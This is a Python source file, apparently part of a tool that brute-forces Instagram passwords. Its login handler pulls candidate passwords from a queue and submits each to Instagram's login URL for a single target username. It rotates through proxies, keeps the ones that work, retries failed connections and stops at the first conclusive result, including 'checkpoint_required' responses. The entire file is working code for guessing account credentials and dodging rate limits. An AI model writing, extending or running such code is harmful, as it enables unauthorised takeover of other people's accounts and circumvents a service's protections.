from __future__ import absolute_import

import aiohttp
import asyncio

import logbook

from app import settings
from app.lib import exceptions
from app.lib.logging import login_attempt_log
from app.lib.models import InstagramResult, LoginAttemptContext, LoginContext

from .requests import request_handler


log = logbook.Logger(__file__)


class login_handler(request_handler):

    __handlername__ = 'login'

    def __init__(self, config, global_stop_event, proxy_handler):
        super(login_handler, self).__init__(config, global_stop_event, proxy_handler)
        self.user = self.config.user

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    @login_attempt_log
    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        log = logbook.Logger('Handling Client Response')

        if response.status >= 400 and response.status < 500:
            log.debug('Response Status Code : %s' % response.status)
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            try:
                log.debug('Creating Result from Response')
                return await self._get_result_from_response(response, context)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response.",
                    extra=context.log_context(response=response)
                )

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    @login_attempt_log
    async def request(self, session, context, retry=1):
        """
        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().
        """
        # Autologger not working because of keyword argument
        log = logbook.Logger('Login Request')
        self.log_post_request(context, log, retry=retry)

        try:
            log.debug('Attempting Request')
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self._login_data(context.password),
                timeout=self.FETCH_TIME,
                proxy=context.proxy.url(scheme='http')
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    log.debug('Handling Client Response')
                    result = await self._handle_client_response(response, context)
                    result = await self._handle_parsed_result(result, context)

                except exceptions.ResultNotInResponse as e:
                    log.error(e, extra=context.log_context(response=response))

                except exceptions.InstagramResultError as e:
                    log.error(e, extra=context.log_context(response=response))

                else:
                    if not result:
                        raise exceptions.FatalException("Result should not be None here.")

                    log.debug('Putting Proxy in Good Queue', extra={'proxy': context.proxy})
                    self.proxy_handler.good.put_nowait(context.proxy)
                    return result

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            retry += 1

            # We probably want to lower this number
            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                # Session should still be alive.
                log.debug('Connection Error... Sleeping')
                await asyncio.sleep(1)
                log.debug('Connection Error... Retrying')
                return await self.request(session, context, retry=retry)
            else:
                log.error(e, extra=context.log_context())
                return None

        except asyncio.TimeoutError as e:
            log.error('TimeoutError', extra=context.log_context())
        except aiohttp.ClientError as e:
            log.error(e, extra=context.log_context())
        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')

    @login_attempt_log
    async def attempt_login(self, session, context, results):
        """
        Instead of doing these one after another, we might be able to stagger
        them asynchronously.  This would be waiting like 3 seconds in between
        tasks just in case the first one immediately doesn't work, or finding
        a faster way of accounting for bad proxies.

        Safer way for now is to do single attempts for password one after
        another.

        TODO
        -----
        Should we incorporate some type of limit here, so that we don't wind
        up trying to login with same password 100 times for safety?
        """
        log = logbook.Logger('Login Attempt')

        stop_event = asyncio.Event()
        index = 0

        while not self.global_stop_event.is_set() and not stop_event.is_set():

            proxy = await self.proxy_handler.get_best()
            context = LoginAttemptContext(
                index=index,
                proxy=proxy,
                password=context.password,
                token=context.token
            )
            index += 1
            log.info(context)

            log.info('Attempting Login {}...'.format(context.password),
                extra={'context': context})
            result = await self.request(session, context)

            if result and result.conclusive:
                log.debug('Got Conclusive Result', extra={'context': context})
                # Returning and setting stop event is kind of redundant since these
                # are running synchronously.
                stop_event.set()
                await results.put(result)
                return

            else:
                if result is None:
                    log.debug('Got Null Result', extra={'context': context})
                else:
                    log.debug('Got Inconclusive Result', extra={'context': context})

    async def consume_passwords(self, passwords, results, token):
        """
        Asyncio Docs:

        asyncio.as_completed
        -------------------
            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.

        TODO
        -----
        Incorporate timeout into asyncio.as_completed() just in case of situations
        where it could get caught.
        """
        if passwords.qsize() == 0:
            log.error('No Passwords to Consume')
            return

        tasks = []
        context = None

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            while not passwords.empty():
                # We might have to watch out for empty queue here.
                password = await passwords.get()
                log.debug(f'Got Password {password} from Queue')

                if not context:
                    # Starts Index at 0
                    context = LoginContext(token=token, password=password)
                else:
                    # Increments Index and Uses New Password
                    context = context.new(password)

                log.debug('Creating Login Attempt Future', extra=context.log_context())
                task = asyncio.ensure_future(self.attempt_login(session, context, results))
                tasks.append(task)

            log.debug('Waiting for Attempts to Finish...')
            return await asyncio.gather(*tasks)
